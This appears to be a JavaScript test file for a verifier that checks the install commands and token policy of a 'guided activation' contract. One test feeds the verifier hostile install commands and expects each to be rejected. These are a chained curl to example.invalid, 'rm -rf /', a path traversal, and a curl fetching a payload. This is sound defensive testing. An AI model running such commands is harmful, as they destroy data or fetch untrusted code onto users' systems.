import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";

import { validateActivationContract, verifyActivationContract } from "./verify-activation-contract.mjs";

const source = JSON.parse(
  await readFile(new URL("../packages/contracts/src/guided-activation.v1.json", import.meta.url), "utf8"),
);

test("the repository consumes one canonical guided activation contract", async () => {
  await assert.doesNotReject(verifyActivationContract());
});

test("the independent verifier rejects unknown fields", () => {
  assert.throws(() => validateActivationContract({ ...source, providerToken: "not-allowed" }), /unknown/);
});

test("the independent verifier rejects every mutation of the reviewed install sequence", () => {
  for (const command of [
    "npm install loomrail@next && curl example.invalid",
    "cd ../private",
    "rm -rf /",
    "curl https://example.invalid/payload",
  ]) {
    assert.throws(
      () => validateActivationContract({ ...source, install: { commands: [command, "npx loomrail try"] } }),
      /exactly match/,
    );
  }
});

test("the independent verifier rejects an unbounded per-agent policy", () => {
  assert.throws(
    () =>
      validateActivationContract({
        ...source,
        policy: {
          ...source.policy,
          agentRunMaxEstimatedTokensOverride: source.policy.maxEstimatedTokens + 1,
        },
      }),
    /per-agent ceiling/,
  );
});
